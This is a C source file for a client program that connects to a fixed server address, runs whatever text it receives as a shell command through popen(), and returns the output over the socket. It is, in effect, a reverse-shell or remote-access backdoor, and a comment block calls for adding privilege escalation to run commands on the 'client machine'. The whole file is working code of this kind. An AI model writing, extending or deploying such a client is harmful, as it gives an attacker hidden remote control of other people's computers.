#define _POSIX_C_SOURCE 2 // Or try _XOPEN_SOURCE 500 if that doesn't work. This is for popen() to not give undeclared error
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h> // For pipe on Linux/macOS

#include "common.h"
#include <signal.h> // For signal handling

volatile sig_atomic_t client_running = 1; // for signal handling

void signal_handler(int sig) {
    if (sig == SIGINT||sig == SIGTERM) {
        client_running = 0;
        printf("Client shutting down...");
    }
}

int main() {

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
            perror("WSAStartup failed\n");
            return 1;
        }
    #endif

    int client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client_socket == -1) {
        fprintf(stderr, "Socket() error %d: %s\n", ERRNO, strerror(ERRNO));
        return 1;
    }

    //Initializing server address
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);

    if(inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) <= 0) {
        fprintf(stderr, "INET_PTON() error %d: %s\n", ERRNO, strerror(ERRNO));
        close(client_socket);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }
    printf("Connecting to %s:%d\n", SERVER_IP, SERVER_PORT);
    if (connect(client_socket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == -1) {
          fprintf(stderr, "connect() error %d: %s\n", ERRNO, strerror(ERRNO));
        close(client_socket);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    printf("Connected to %s : %d\n", SERVER_IP, SERVER_PORT);

    while(client_running) {
        printf("Waiting for commands...\n");
        char recvBuffer[BUFFER_SIZE];
        ssize_t bytes_recieved = recv(client_socket, recvBuffer, BUFFER_SIZE - 1, 0);

        printf("recv() returned: %zd\n", bytes_recieved);
        if (bytes_recieved > 0) {
            recvBuffer[bytes_recieved] = '\0';
            printf("Received: %s\n", recvBuffer);

            /*
             * HERE LIES COMMAND EXECUTION AND SENDING BACK OUTPUT
             * PRIVILEGE ESCALATION SHOULD BE REMEMBERED, MUST BE IMPLEMENTED TO RUN CERTAIN COMMANDS ON CLIENT MACHINE
             *
             * note: Popen() is a high level abstraction, pipe(), fork(), and exec() can be used in cases such as:
             *      Executing a command as a different user (requires careful privilege management).
             *      Performing more complex process management.
             */

            FILE *fp = popen(recvBuffer, "r"); // Execute command, read output
            if (fp == NULL) {
                char err[BUFFER_SIZE];
                snprintf(err, sizeof(err), "popen() failed: %s", strerror(ERRNO));
                if (send(client_socket, err, strlen(err) + 1, 0) == -1) { // Send popen() failure error message to server
                    perror("send() failed");
                    break;
                }
                continue; // Continue to next command
            }

            // Get command output from file pipe
            char output_buffer[BUFFER_SIZE];
            size_t output_len = 0;

            /*
             * There's a small possibility of a buffer overflow in the following while loop if the command produces an extremely large amount of output. The BUFFER_SIZE might be reached * before the fgets loop has a chance to exit due to reaching the end of the file.
             */

            while (fgets(output_buffer + output_len, BUFFER_SIZE - output_len, fp) != NULL) {
                output_len += strlen(output_buffer + output_len);
                if (output_len >= BUFFER_SIZE-1) {
                    printf("Large command output, buffer overflow, output truncated");
                    break; // prevent buffer overflow
                }
            }
            if (output_len == 0) { // Check if no output was read
                const char *no_output_message = "No output from command. (or command unrecognized)"; // Send a "no output" message
                send(client_socket, no_output_message, strlen(no_output_message) + 1, 0); // +1 for null terminator
            } else {
                printf("About to send %zu bytes: %s\n", output_len, output_buffer);

                // Send the output back to the server
                if (send(client_socket, output_buffer, output_len, 0) == -1) {
                    fprintf(stderr, "send() error %d: %s\n", ERRNO, strerror(ERRNO));
                    break;
                }
            }

            if (pclose(fp) == -1) {
                fprintf(stderr, "pclose() failed: %d\n", ERRNO);
            }



        } else if (bytes_recieved == 0) {
            printf("Received nothing from server and/or server disconnected\n");
            printf("Disconnecting & closing socket...\n");
            break;
        } else {
            fprintf(stderr, "recv() error %d: %s", ERRNO, strerror(ERRNO));
            break;
        }
    }

    close(client_socket);
    #ifdef _WIN32
        WSACleanup();
    #endif

    return 0;
}
